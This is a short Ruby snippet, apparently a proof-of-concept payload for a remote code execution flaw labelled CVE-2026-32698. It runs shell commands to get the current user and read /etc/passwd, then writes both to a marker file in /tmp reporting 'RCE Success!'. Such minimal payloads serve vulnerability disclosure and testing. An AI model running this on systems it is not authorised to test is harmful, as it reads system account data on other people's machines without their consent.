user = `whoami`.strip
passwd_content = `cat /etc/passwd`

File.write(
  '/tmp/CVE_2026_32698_RCE_CONFIRMED.txt',
  "RCE Success!\nRunning as: #{user}\n\nContents of /etc/passwd:\n#{passwd_content}\n"
)
